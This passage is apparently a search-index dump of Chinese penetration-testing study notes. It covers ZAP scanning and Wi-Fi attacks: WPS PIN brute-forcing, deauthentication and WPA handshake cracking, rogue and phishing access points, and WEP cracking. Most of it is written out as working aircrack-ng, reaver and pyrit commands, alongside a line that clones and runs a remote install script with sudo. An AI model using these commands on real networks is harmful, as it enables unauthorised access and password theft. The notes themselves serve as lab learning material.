可以\npath：路径\nflag标志位：安全相关的flag，是否需要安全的连接才能够访问响应的变量\n时间值：时间信息，表示cookie是否过期，这个值必须很大，值远远超过当前时间\n名称\n值\n\n必须严格按照合适编辑cookie文件，否则无法使用\n\n\n\n\n\n\n\n\n\n\n如果保存成功了表示cookie文件格式没有问题，若是不成功会报错\n\n开始扫描\n\n\n\n\n\n\n\n\n\n\n\n可以看到已经成功使用cookie身份认证方式进行扫描\nArachni\n\n\n\n\n\n\n\n\n官网下载地址：\nhttps://www.arachni-scanner.com/download/\n安装及使用：https://blog.csdn.net/weixin_39776817/article/details/113230898\nOWASP_ZAP\n\n\n\n\n\n\n\n\n\nZed attack proxy\nWEB Application集成渗透测试和漏洞挖掘工具\n开源免费跨平台简单易用\n\n\n\n\n\n\n\n\n\n\n\n\n持久保存会话内容，默认文件夹\n持久保存会话内容，自定义路径\n不保存会话内容\n\n截断代理\n配置OWASP_ZAP代理\n\n\n\n\n\n\n\n\n\n\n\n接着在浏览器将OWASP_ZAP证书的导入配置本地8080端口监听即可\n\n使用截断代理\n\n\n\n\n\n\n\n\n\n\n\n\n访问过的所有网站都可以被截取到OWASP_ZAP中；使用此功能可以进行手动爬网，点击网站中任何功能点都被OWASP_ZAP记录，利于之后进行分析\n\n安装插件\n\n\n被动扫描\n警报功能\n\n\n\n\n\n\n\n\n\n\n\n基于被动扫描，会通过警报提示可能存在的漏洞\n主动扫描\n两种扫描方法\n\n\n\n\n\n\n\n\n\n\n\n\n\n也可通过左栏访问过的网站地址右键进行攻击\n\nFuzzer\n\n工具—&gt;Fuzz\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFuzzer可以自定义的需要Fuzz的字符或者也可以添加一个文件\n打开Fuzz的方法为以上两种\nOWASP_ZAP—API\n\n\n\n\n\n\n\n\n自己开发扫描工具可以调用OWASP_ZAP的API\n官方文档：http://zap/ （需要挂外网）\nOWASP_ZAP基本功能Scan Mode\n\n\n\n\n\n\n\n\n\nScan Mode——Safe̵（安全模式）Protected̵（保护模式）Standard̵（标准模式）ATTACK （攻击模式）\n从左到右扫描攻击性逐渐增强\n\n\n\n\nScan policy（扫描策略）\n\n\n\n\n\n\n\n\n配置扫描策略\n\n选择站点—&gt;右键—&gt;攻击—&gt;主动攻击\n\n\n\n\n\n\n\n\n\n\n\n\n集成的默认策略\n\n自定义扫描策略\n\n\n\n\n\nAnti CSRF Tokens\n添加不同的CSRF Token\n\n\nScope\n\n\n\n\n\n\n\n\n凡是在Scope中的都可以使用同一个策略进行扫描；由于每次访问网站都会被记录，而使用Scope则可以快速筛选出要进行扫描要进行审计的目标站点，过滤掉不需要的信息\n\nHttp Sessions\n\n\n\n\n\n\n\n\n\n手动身份认证：客户端访问目标站点后返回给客户端Session，OWASP_ZAP会自动记录由服务器端返回给客户端的Session，后续由OWASP_ZAP发起扫描请求时会自动使用记录的Session进行扫描（所谓手动就是通过浏览器手动输入用户名密码生成Session的过程）\n当手动身份认证不适用的时候，可以使用表单或NTLM等其他身份认证方式\n\n\n\n\n\n\n\n\n\n\n当有多个用户Session的话，OWASP_ZAP可以很方便的进行切换，不需要手动输入Session&#x2F;Cookie\n加解密\n\n","slug":"Kali渗透测试-Web渗透【扫描工具】","date":"2023-01-27T02:26:11.000Z","categories_index":"Kali","tags_index":"Kali","author_index":"Aurora"},{"id":"7256fe0cda8f1724f7ca8b321c3bd89b","title":"Kali渗透测试-Web渗透【HTTP】","content":"WEB攻击面\n\n\n\n\n\n\n\n\n\nNetwork \n\nOS\n\nWEB Server \n\nApp server \n\nWeb Application \n\nDatabase \n\nBrowser\n\n\nHTTP协议基础\n\n\n\n\n\n\n\n\n\n明文\n无内建的机密性安全机制\n嗅探或代理截断可查看全部明文信息\nhttps只能提高传出层安全\n\n\n无状态\n每一次客户端和服务器端的通信都是独立的过程\nWEB应用需要跟踪客户端会话（多步通信）\n不使用cookie的应用，客户端每次请求都要重新身份验证（不现实）\nSession用于在用户身份验证后跟踪用户行为轨迹\n提高用户体验，但增加了攻击向量\n\n\n\n\nCycle（请求响应）\n一个请求 &#x2F; 一个响应\n\n\n重要的header\nSet-Cookie：服务器发给客户端的SessionID（被窃取的风险）\nContent-Length：响应body部分的字节长度\nFuzz或者暴力破解查看Content-Length字段\n\n\nLocation：重定向用户到另一个页面，可识别身份认证后允许访问的页面\nCookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）\nReferrer：发起请求之前用户位于哪个页面，服务器基于此头的安全限制很容易修改绕过\n\n\n\nHTTP协议状态码\n\n\n\n\n\n\n\n\n\n服务端响应的状态码表示响应的结果类型（5大类50多个具体响应码）\n\n100s：服务器响应的信息，通常表示服务器还有后续处理，很少出现\n\n200s：请求被服务器成功接收并处理后返回的响应结果\n\n300s：重定向，通常在身份认证成功后重定向到安全页面（301&#x2F;302）\n\n400s：表示客户端请求错误\n\n401：需要身份验证\n403：拒绝访问\n404：目标未发现\n\n\n500s：服务器内部错误（503：服务不可用）\n\n\nhttp协议状态码详解：\nhttp://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html\n","slug":"Kali渗透测试-Web渗透【HTTP】","date":"2023-01-27T01:20:58.000Z","categories_index":"Kali","tags_index":"Kali,HTTP","author_index":"Aurora"},{"id":"5a2e579f4b4b70f5a335b50e2b70ce14","title":"Kali渗透测试-WPS攻击及黑客攻击方式","content":"WPS (WIRELESS PROTECTED SETUP）\n\n\n\n\n\n\n\n\n\nWPS是WiFi联盟2006年开放的一项技术\n\n通过PIN码来简化无线接入的操作，无需记住PSK\n\n路由器和网卡各按一个按钮就能接入无线\n\nPIN码是分为前后各4位的2段共8位数字\n\n\n\n安全漏洞\n\n2011年被发现安全涉及漏洞\n\n接入发起方可以根据路由器的返回信息判断前4位是否正确\n\n而PIN码的后4位只有1000中定义的组合(最后一位是checksum)\n\n所以全部穷举破解只需要11000次尝试\n\n若采用8位的PSK（包含数字，大小写字母等），破解次数最高可达218,340,105,584,896次\n\n\n\n\n获得PIN后，可直接请求获取PSK\n\n标准本身没有设计锁定机制，目前多个厂商已实现锁定机制（限制失败连接的尝试次数）\n\n包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能\n\n即使在WEB节目中有关闭WPS，配置也不会生效\n\n攻击难度相对较低，防御却十分困难\n\n一般可在4-10小时爆破密码\n\nPSK\n\n\n用计算器直接算出PIN（早期部分厂商的PIN码是AP MAC的前三字节（转10进制））\n\n如：C83A35——13122101，00B00C——00045068\n\n\n\nWPS 攻击\n启动侦听模式后，扫描支持WPS的AP\n\nwash -F -i wlan0mon\n\n\n\n\n\n\n\n\n\n-F：忽略错误帧的告警信息；-i：指定从那个网卡侦听\n\n\nairodump-ng wlan0 --wps   # airdump-ng也可用于抓取wps\n\n\n\n爆破PIN码\n\nreaver -i wlan0 -b &lt;AP mac&gt; -vv   # 直接爆破\n\n\n利用漏洞获取PIN码\n\nreaver -i wlan0 -b &lt;AP mac&gt; -vv -K 1\n\n\n\n\n\n\n\n\n\nreaver破解PIN码时，使用 -K 1 则调用命令pixiewps测试AP是否存在漏洞，存在则依据漏洞获取，否则爆破。也可以单独使用pixiewps命令测试，该方法只适用于固定厂商的芯片，成功率很低\n\n\n\n\n\n获取PSK\n\nreaver -i wlan0 -b &lt;AP mac&gt; -vv -p 88888888\n\n\n\n\n\n\n\n\n\n-p：指定PIN；当已经获取到PIN码之后，利用上面的命令直接获取到PSK\n\n\n\n\n真实破解成功效果参见：https://www.cnblogs.com/qiyeboy/p/5825525.html\n可能存在的问题\n\n\n\n\n\n\n\n\n\n很多厂家实现了锁定机制，所以爆破时应注意限速\n一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定\n\n综合自动化无线密码破解工具wifite\n\n\n\n\n\n\n\n\n可自动创建监听网卡，破解流程基本和前面的相同\n\n\n\n\n\n\n\n\n\n\n\n先尝试Pixie-Dust攻击，若攻击不成功；会进行常规的WPS攻击（尝试11000次爆破）；若还是不成功会尝试用伪造认证方式，打掉客户端抓取四次握手包进行字典爆破。和之前使用的破解思路是相同的。\n黑客攻击方式wifipumpkin3攻击框架\n设置无线网卡\nset interface wlan0\n\n\n设置无线名称\nset ssid &lt;无线名称&gt;\n\n\n设置代理插件\nset proxy noproxy\n\n\n开启dns转发\nignore pydns_server\n\n\n开启钓鱼wifi\nstart\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n由于网卡没有AP模式，无法使用wifipumpkin3进行wifi钓鱼攻击；后续更换网卡补充此内容。\n实验可见文章：https://www.cnblogs.com/z9m8r8/articles/16339648.html\nWPA 企业钓鱼攻击\n伪造AP\n\nvim hostapd-wpe.conf\n\n\n\n启动wifi\n\nhostapd-wpe hostapd-wpe.conf\n\n\n\n\n\n\n\n\n\n\n\n\n\n当用户连接时会要求输入用户名和密码进行验证，因为是假AP，所以验证不成功，但此时就可以获得challenge和response\n\nasleap破解\n\nasleap -C &lt;challenge&gt; -R &lt;response&gt; -W /usr/share/john/password.lst\n\n\n\n\n\n\n\n\n\n\n\n\n\n由于设备原因，以上两个实验未完成，后续补充\n可见文章以及图片来源：https://www.cnblogs.com/z9m8r8/articles/16339648.html\n","slug":"Kali渗透测试-WPS攻击","date":"2023-01-25T00:22:18.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"07e524c49773ccced0f88b5b9bd3112f","title":"Kali渗透测试-WPA攻击","content":"WPA PSK攻击\n\n\n\n\n\n\n\n\n\n只有一种密码破解方法\nWPA不存在WEP的弱点\n\n\n只能暴力破解\nCPU资源\n时间\n字典质量\n网上共享的字典\n泄露密码\n地区电话号码段\nCrunch生成字典\nKali中自带的字典文件\n\n\n\n\n\n学习资源：\nhttp://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/\nPSK破解过程\n\n\n\n\n\n\n\n\n\n启动monitor\n开始抓包并保存\nDeauthentication攻击获取4步握手信息（抓不到包的话打断目前存在的连接）\n使用字典暴力破解\n\n\n启动monitor\n\n\n侦听周围目标\n\n\n\n抓取指定AP数据包\n\n\n\n\n\n\n\n\n\n\n–bssid：AP的MAC；-c：11AP信道；-w：wpa抓包结果保存为wpa；\n\n\n\n\n\n\n\n\n\n\n\n\n此时没有抓到四步握手的数据包，只能打掉客户端连接进行抓取\n\naireplay-ng -0 10 -a 50:21:EC:42:E3:80 -c DC:31:D1:9B:61:C5 wlan0\n\n\n\n\n\n\n\n\n\n\n-0攻击包用于打掉客户端连接；-a：AP的MAC地址；-c：STA的MAC地址\n\n报错\n\n\n\n\n\n\n\n\n\n\n\n\n出现报错，wlan0工作在11信道，而AP工作在6信道；使用 airodump-ng wlan0 --bssid 50:21:EC:42:E3:80 -c 6 -w wpa 命令切换到6信道侦听即可\n\n\n\n\n\n\n\n\n\n\n此时已经发送了10个0号攻击包\n\n抓取到握手包\n\n\n\n\n\n\n\n\n\n\n图中红色方框部分就是抓取到握手包的标志\n\n暴力破解\n\n\n\n\n\n\n\n\n\n\n这些都是抓取到无线包，其中只有.cap后缀的包用于aircrack-ng暴力破解（由于前几次抓取握手包不成功，需要多抓几次，最后一次wpa-06.cap成功抓取握手包）\n\n使用aircrack-ng内置的字典进行暴力破解\n\n路径：/usr/share/john/password.lst\n其中想要破解的密码必须要在密码字典中，若不在密码字典中破解不出密码\n\n\naircrack-ng -w &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst wpa-06.cap\n\n\n\n\n\n\n\n\n\n\n\n密码已经被爆破出来\n\n\n\n\n总结：\n\n\n\n\n\n\n\n\n破解无线wifi可以分为以下几步：\n查看网卡名：iwconfig设置监听模式：airmon-ng start wlan0扫描附近WIFI：airodump-ng wlan0mon选定目标监听其流量：airodump-ng -w tplink -c (channel） –bssid (BSSID) wlan0mon选定连接的客户端进行攻击：aireplay-ng -0 50 -a (BSSID) -c (STATION) wlan0mon对抓取到的cap包进行暴力破解：aircrack-ng -w (password.txt) -b (BSSID) (xxx.cap)\nKali常用字典位置\n\n使用大字典进行暴力破解\n\n\n无AP情况下的WPA密码破解\n\n\n\n\n\n\n\n\n\n启动monitor\n开始抓包并保存\n根据 probe 信息伪造相同ESSID的AP\n抓取四步握手中的前两个包\n使用字典暴力破解\n\n原理：\n\n\n\n\n\n\n\n\n\n\n依据目标探测的AP，我们自己伪造一个ESSID为其名的AP，然后根据WPA认证机制（上图）我们就可以知道ESSID，ANonce，SNonce，MAC1，MAC2，为此我们只有PSK不知道，但是目标会将PMK（PSK+ESSID计算得来），ANonce，SNonce，MAC1，MAC2计算的MIC和SNonce发给伪造的AP，又因相关加密算法是已知的，所以我们可以暴力枚举可能的PSK值，然后计算MIC，与目标发过来的MIC所对比，当一致时则破解成功。\n\n启动wlan0的monitor模式\n\n伪造AP\n\n先使用sirdump-ng抓取客户端曾经连接过的AP\n\n\nairbase-ng –essid zmr -c 6 -Z 4  wlan0\n\n\n\n\n\n\n\n\n\n-c指定信道，-Z代表WPA2加密，-z表示WPA1加密，不使用z &#x2F; Z参数表示open状态；4是指定CCMP加密\n\n\n抓包破解\n\nairodump-ng wlan0 –essid 淡墨天羽 -w wpa -c 6\n\n\n之后会抓到WPA前2步的握手包，再使用aircrack-ng进行暴力破解\n\n\n\n\n\n\n\n\n\n这里由于设备等因素实验做得并不完备，后续补充。WPA破解思路就是这样。\n\n\n\n\n无线密码破解工具AIROLIB 破解密码\n\n\n\n\n\n\n\n\n由于PSK+ESSID计算PMK时要经过4096次的迭代计算，这使暴力破解的速度很慢，破解过程中CPU等资源消耗严重，为此我们可以事先将可能PMK计算出来，破解时再用PMK进行后续计算，这使得玻璃破解的速度会得到很大的提高，不过亦有缺点，当ESSID变动后当前的PMK又得重计算。\n\nAIROLIB破解\n设计用于存储ESSID和密码列表\n计算生成不变的PMK（计算资源消耗型）\nPMK在破解阶段被用于计算PTK（速度快，计算资源要求少）\n通过完整性摘要值破解密码\nSQLlite3数据库存储数据\n\n\n\n\n\n\n将ESSID放入一个文本文件中\n\n\nairolib-ng db –import essid essid.txt         # 导入essid\n\n\n\n\n\n\n\n\n\n创建一个数据库db，同时导入essid存入essid.txt\n\n\n\n\n查看数据库状态\n\n\n\n\n导入密码文件\n\nairolib-ng db –import passwd &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst\n\n\n\n\n\n\n\n\n\n\n\n\n\n其中有些小于8个字符的密码会被剔除掉，导入数据库时会被忽略掉\n\n\n\n\n\n\n\n\n\n\n此时有653个密码被导入\n\nairolib-ng  db –batch  \n\n\n\n\n\n\n\n\n\n生成PMK\n\n\n\n\n\n\n\n\n\n\n\n\n此时已经就有了PMK的字典\n\n使用db中的PMK值进行破解\n\naircrack-ng -r db wpa-01.cap\n\n\n\n\n\n\n\n\n\n\n\n破解成功\n\n\nJTR 破解密码\n\n\n\n\n\n\n\n\n\nJohn the ripper\n\n快速的密码破解软件\n\n支持基于规则动态扩展密码字典（破解时动态扩展）\n\n\n\n很多人喜欢用手机号码做无线密码\n\n获取号段并利用JTR规则增加最后几位的数字\n\n\n配置文件 &#x2F;etc&#x2F;john&#x2F;john.conf\n\n[list.Rules:Wordlist]    # 配置文件中存放密码规则的字段\n$[0-9]$[0-9]$[0-9]$[0-9]        # 添加的规则\n\n\n\n\n打开配置文件添加规则\n\nvim &#x2F;etc&#x2F;john&#x2F;john.conf\n\n\n在规则的末尾添加新规则$[0-9]$[0-9]$[0-9]$[0-9] 后保存\n\n\n\n\n找到某个地区前七位的手机号码号段写入一个文件中\n\n\n使用john生成新的完整手机号码\n\njohn --wordlist=phone_num.txt --rules --stdout\n\n\n\n\n\n\n\n\n\n–wordlist：使用的那一个密码字典；–rules：对密码字典使用密码规则；–stdout：将内容全部输出出来\n\n\n\n\n\n破解\n\njohn --wordlist=phone_num.txt --rules --stdout | aircrack-ng -e 淡墨天羽 -w - wpa-01.cap\n\n\n\n\n\n\n\n\n\n-w后面的-表示前面输出的手机号码内容（一般情况-w后面指定一个密码字典）\n\n\n\n\n\n\n\n\n\n\n\n\n密码最终破解不成功，JTR密码破解大概思路和操作如上\n\n\n\n\nCOWPATTY 破解密码\n\n\n\n\n\n\n\n\ncowpatty 也是通过提前计算PMK来提升破解速度的\n\nWPA密码通用破解工具\n使用密码字典\ncowpatty -r wpa.cap -f password.lst -s \n\n\n使用彩虹表（PMK）\ngenpmk -f password.lst -d pmkhash -s   #第三方工具生成PMK\ncowpatty -r wpa.cap -d pmkhash -s 　　#使用PMK破解\n\n\n\n\n监听，抓包\n\n破解\n\ncowpatty -r wpa-01.cap -f /usr/share/john/password.lst -s 淡墨天羽\n\n\n\n\n\n\n\n\n\n-f：指定密码文件的路径；-s：指定ESSID名称\n\n\n\n\n\n使用PMK破解\n生成PMK\n\ngenpmk -f /usr/share/john/password.lst -d pmkhash -s 淡墨天羽 \n\n\n\n\n\n\n\n\n\n-d：表示生成的PMK存放在pmkhash这个文件中\n\n\n\n\n破解\n\ncowpatty -r wpa-01.cap -d pmkhash -s 淡墨天羽   \n\n\n\n\n\n\n\n\n\n\n 速度很快，毫秒速度破解出密码；cowpatty优势就在于先计算PMK后进行调用彩虹表破解速度提升\n\n\n\n\nPYRIT 破解密码（推荐）\n\n\n\n\n\n\n\n\n\n与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度\n\n独有的优势\n\n除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK\n本身支持抓包获取四步握手过程，无需用Airdump抓包\n也支持传统的读取airodump抓包获取四步握手的方式\n\n\n只抓取WAP四次握手过程包\n\npyrit -r wlan2mon -o wpapyrit.cap stripLive    # -r 指定网卡，-o指定输出文件，striplive过滤出握手包pyrit -r wpapyrit.cap analyze　　# 对抓的握手包进行分析（AP的MAC，加密方式等）\n\n\n从airodump抓包导入并筛选\n\npyrit -r wpa.cap -o wpapyrit.cap strip   # 将airodump抓的包过滤下\n\n\n使用密码字典直接破解\n\npyrit -r wpaprit.cap -i password.lst -b  attack passthrough\n\n\n数据库模式破解\n\n默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库\n查看默认数据库状态：pyrit eval\n导入密码字典：pyrit -i password.lst import_passwords (会自动剔除了不合规的密码）\n指定ESSID：pyrit -e zmr create_essid\n计算PMK：pyrit batch (发挥GPU计算能力）\n破解密码：pyrit -r wpapyrit.cap -b  attack_db\n\n\n\n\n\n\n\n\n\n\n\n\npyrit很老的工具了，kali中已经没有了，需要手动安装，看了很多帖子安装老报错，思路如上。\npyrit手动安装命令：\ngit clone https:&#x2F;&#x2F;github.com&#x2F;hacker3983&#x2F;pyrit-installer &amp;&amp; cd pyrit-installer &amp;&amp; sudo bash install.sh\n\npyrit破解文章：\nhttps://www.cnblogs.com/z9m8r8/articles/16336553.html\n","slug":"Kali渗透测试-WPA攻击","date":"2023-01-24T02:29:17.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"fd3a6a07295146ed58cfec16849c7890","title":"Kali渗透测试-无线渗透实操","content":"AIRCRACK-NG基础\n\n\n\n\n\n\n\n\n\n无线渗透和审计神器   \n\n包含各种功能的工具套件 \n\n网络检测\n嗅探抓包\n包注入\n密码破解\n\n\n\n无论是有线或者无线，进入内网之后的攻击方式是相同的并且攻击方式是多样的\nAIRMON-NG检查网卡驱动\nairmon-ng\n\n\n\n\n\n\n\n\n\n\n\nairmon-ng列出网卡信息，Driver为驱动信息；若是驱动有问题，会出现很多难以解决的问题；Chipset为芯片型号\n\nairmon-ng check\n\n\n\n\n\n\n\n\n\n\n检查AIRCRACK套件的使用与当前系统可能存在冲突的进程，可使用 airmon-ng check kill 将其关闭。\n\n\n开启和停止无线侦听\nairmon-ng start wlan0\n\n\n查看当前工作信道\niwlist wlan0mon channel\n\n\n\n\n\n\n\n\n\n\n\n图中显示当前工作在10信道；可以使用”airmon-ng start wlan0 1&#x2F;2&#x2F;3……”修改工作的信道\nAirodump-ng\n\n\n\n\n\n\n\n\nairodump-ng无线抓包套件之一\n\nairodump-ng wlan0mon\n\n\n\n\n\n\n\n\n\n\n\n\n使用airodump-ng抓包的话，此时无线网卡工作在所有信道中进行轮询，每个信道进行监听发现是否存在AP\n\nairodump-ng wlan0mon -c 1\n\n\n\n\n\n\n\n\n\n指定信道进行侦听\n\n\n\n\n\n\n\n\n\n\n\n\n\n信道是交叉的重叠的，依旧可能会抓到其它信道的\n\n\n\n\n\n\n\n\n\nairodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B       #指定要抓的具体ssidairodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;test.cap     #抓包结果写入test.capairodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;test.cap –ivs      #只抓取WEP包含ivs的信息\n与airodump-ng wlan0mon -c 1命令类似\n抓包结果分析\n\n\n\n\n\n\n\n\n\nBSSID：AP的MAC地址\n\nPWR：网卡接收到的信号强度，距离越近信号越强（如上图中PWR字段）\n\n-1：驱动不支持信号强度、STA距离超出信号接受范围\n\n\nRXQ：最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有固定信道时才会出现\n\nBeacons：接收到此AP发送的beacon帧数量\n\n#Data：抓到的数据帧数量(WEP表示IV数量)，包含广播数据帧\n\n#&#x2F;s：最近10秒内，每秒平均抓到的帧的数量\n\nCH：信道好(从beacon帧中获得)，信道重叠时可能发现其他信道\n\nMB：AP支持的最大速率\n\nENC：采用的无线安全技术WEP、WPA、WPA2、OPEN\n\nCIPHER：采用的加密套件CCMP、TKIP、WEP40、WEP104\n\nAUTH：身份验证方法MGT（企业）、PSK（个人）、SKA（WEP）、OPEN\n\nESSID：无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP\n\nSTATION：STA的MAC地址，连接AP的MAC地址\n\nLost：通过sequence number判断最近10秒STA发送丢失的数据包数量(管理帧、数据帧)\n\n干扰、距离\n发包不能收，收包不能发\n\n\nPackets（Frames）：STA发送的数据包数量\n\nProbes：STA探测的ESSID\n\n\n排错\n\n\n\n\n\n\n\n\n\n不显示任何AP和STA信息\n\n物理机场景下使用笔记本内置无线网卡时，确保BIOS中已经启动无线网卡\n确认无线网卡在managed模式下可以正常工作\n尝试禁用network-manager服务\n尝试卸载rmmod和重新加载modprobe驱动\n\n\n工作一段时间后airodump-ng无法继续抓包\n\nairmon-ng check kill\n确认wpa_supplicant进程已停止\n\n\n\nAIREPLAY-NG（注入包）\n\n\n\n\n\n\n\n\n\n产生或者加速无线通信流量\n向无线网络中注入数据包\n伪造身份验证\n强制重新身份验证\n抓包重放\n\n\n用于后续WEP和WPA密码破解\n支持10种包注入\n\n\n获取包的两种途径\n指定接口(-i)\n抓包文件pcap(-r)\n\n\n\n\n\n\n\n\n\n\n\n\n\n过滤数据包的选项：\n-b：指定AP的MAC地址\n-d：目标地址的MAC地址\n-s：源MAC地址\n-m：最小的包长度\n-n：最大的包长度\n-u：帧类型\n-v：帧的子类型\n-t&#x2F;-f&#x2F;-w：802.11无线包头帧控部分字段的定义\n\n\n\n\n\n\n\n\n\n\n重放选项：\n-c：目标MAC地址\n-h：源MAC地址\n\n\n\n\n\n\n\n\n\n\n攻击模块\nAIREPLAY-NG排错\n\n\n\n\n\n\n\n\n\nAireplay-ng命令挂起没有任何输出\n\n无线网卡与AP工作在不同信道\n\n\n报错”write failed: Cannot allocate memory wi_write():illegal seek”\n\n无线网卡使用Broadcom芯片（bcm43xx)，替换为b43驱动可解决\n\n\n可注入但速度很慢，并提示内核消息”rtc:lost some interrupts at 1024Hz”\n\n没有修正方法，此时可以启动多个aireplay-ng命令提高速度\n\n\n使用-h参数指定注入MAC地址与网卡MAC地址不一致报错\n\n建议保持一致 (macchange命令修改mac地址)\n\n\n\n修改MAC地址：\n\nAIREPLAY-NG包注入测试\n\n\n\n\n\n\n\n\n\n检测网卡是否可以注入包\n\n检测AP的响应时间\n\n回包率反应链路质量\n\n\n如果有两个无线网卡，可以检测具体可以注入哪种攻击（一个网卡也可以）\n\n基本测试检测AP对probe广播的响应\n\n向每AP发30包\n网卡成功发送并可接收包的能力\n\n\n\n基本测试\n\n\n\n\n\n\n\n\n直接发probe包\n\naireplay-ng -9 wlan0mon\n\n\n\n\n\n\n\n\n\n\n\n当出现Injection is working!字段表示无线网卡满足向网络中注入数据包的功能性的要求；\nPower字段在0至-50之间可以认为信号强度强\n向隐藏AP&#x2F;指定SSID注入\naireplay-ng -9 wlan0mon -e H3C_C9DFED -a 90:5D:7C:C9:DF:EF\n\n\n\n\n\n\n\n\n\n\n\n图片来源：https://www.cnblogs.com/z9m8r8/articles/16157071.html\n由于附近没有AP可用，附一张网上的图片\ncard to card注入测试（两块无线网卡都是monitor模式）\n\n\n\n\n\n\n\n\n\n具体攻击方式\n\n-i 指定作为AP的网卡\n\n\n结果有 Failed，”可能” 是注入MAC和真正MAC不相同导致\n\n添加一个新端口进行测试\n\niw dev wlan0 interface add wlan1mon type monitor\n\n\n\naireplay-ng -9 -i wlan0mon wlan1mon\n\n\n\n\n\n\n\n\n\n\n\n\n\n在进行card to card之前会进行一个基本测试探测周围附近的AP，之后进行card to card注入；注入0号攻击包OK，1号攻击包OK并且分为open和psk两种方式；2&#x2F;3&#x2F;4&#x2F;6攻击包OK；5&#x2F;7攻击包OK（这两个包有时候会失败若是Faile，则是注入MAC（-h参数指定的MAC地址）和真正MAC不相同导致）\nMAC地址绑定攻击\n\n\n\n\n\n\n\n\n\n管理员误以为MAC绑定是一种安全机制\n\n限制可以关联的客户端MAC地址\n\n准备AP\n\nAP基本配置\n开启无线过滤\n\n\n修改MAC地址绕过过滤\n\n\n路由器配置MAC地址绑定\n网卡修改MAC并接入WiFi\n思路\n使用airodump-ng wlan0mon侦听允许连接的MAC地址\n使用macchanger -m [MAC地址]  [网卡名称]进行软改MAC地址\n最终可正常连接WiFi\n\n\n\nWEP攻击WEP共享密钥破解\n\n\n\n\n\n\n\n\n\nWEP密码破解原理\nIV并非完全随机\n每224个包可能出现一次IV重用\n收集大量IV之后找到相同IV及其对应密码文，分析得出共享密码\n\n\nARP回包中包含IV\nIV足够多的情况下，任何复杂程度的wep密码都可以被破解\n思路\n启动monitor模式\n启动抓包并保存抓包\nDeauthentication抓包XOR文件\n使用Deauthentication打掉合法客户端，使其重连抓取challenge进行异或计算\n\n\n利用XOR文件与AP建立关联\n执行ARP重放\n获取大量IV值\n\n\nDeauthenticiation触发ARP数据包\n收集足够DATA之后破解密码\n\n\n\nWEP-FAKE AUTHENTICATION\n\n\n\n\n\n\n\n\nWEP破解全部需要首先伪造认证,以便与AP进行正常通信\n不产生arp数据包\naireplay-ng -1 0 -e kifi  -h  \naireplay-ng -1 60 -o 1 -q 10 -e  -a  -h  \n\n每6000秒能发送reauthentication(默认是发送三次)\n-o 1 每次身份认证只发一组认证数据包\n-q 10 每10秒发keep-live帧\n\nFAKE AUTHENTICATION 排错\n\n\n\n\n\n\n\n\n\n某些AP验证客户端MAC地址OUI（前三个字节）\nMAC地址可能存在过滤\n出现Denied(code 1) is WPA in use：\nWPA&#x2F;WPA2不支持Fake authentication\n\n\n需要使用真实MAC地址\n物理上需要靠近AP\n侦听信道正确\n\nDEAUTHENTICATION攻击\n\n\n\n\n\n\n\n\n\n用于强制客户端与AP断开连接\n\n重连生成ARP请求,AP回包包含IV\n\nWPA重连过程中抓取四步握手过程\n\n无客户端情况下此攻击无效\n\n\n\naireplay-ng -0 0 -a  -c  \n\n不指定-c 参数时候，以广播包攻击所有客户端\n每攻击发送128个包，64个给AP，64个给客户端\n物理足够接近被攻击者\n-0 0(一直发送数据包)\n需要物理足够接近被攻击者，同时与被攻击者使用相同的无线标准b、n、g\n客户端可能拒绝广播帧，建议指定客户端\n\n\n\nARP重放（用于获取大量的IV值）\n\n\n\n\n\n\n\n\n\n侦听正常的ARP包并重放给AP\n\nAP的回包中包含大量弱IV，可以用于WEP密码破解\n\naireplay-ng -3 -b  -h  \n\n-h 合法客户端&#x2F;供给者mac\n\n\nAirodump-ng data字段\n\n64bit密钥：建议25万data\n\n128bit密钥：建议150万data\n\n\n\nAirecrack-ng wep.cap  # 将侦听到的无线数据保存下来，用于wep密钥破解\n\n\nWEP-PRE SHARE KEY\n\n\n\n\n\n\n\n\n\nWEP密码破解原理\n\nWEP使用的IV值并非完全随机，每224个包就可能存在一次IV重用（但是并非一定出现）\n收集大量IV值之后，找出相同IV及其对应的密文，分析得出密码\n\n\nARP回包中存在大量IV值\n\nIV值足够多的情况下，任何复杂程度的WEP密码都可以破解\n\n\n实验环境：具有基本配置的AP\n开始侦听无线网络\n用户进行登录，密钥流被抓获\n\n\n\n\n\n\n\n\n（预设的共享密钥与IV值进行计算所得出的密文）\n\n目录下查找保存有xor结尾的密文文件\n使用fake 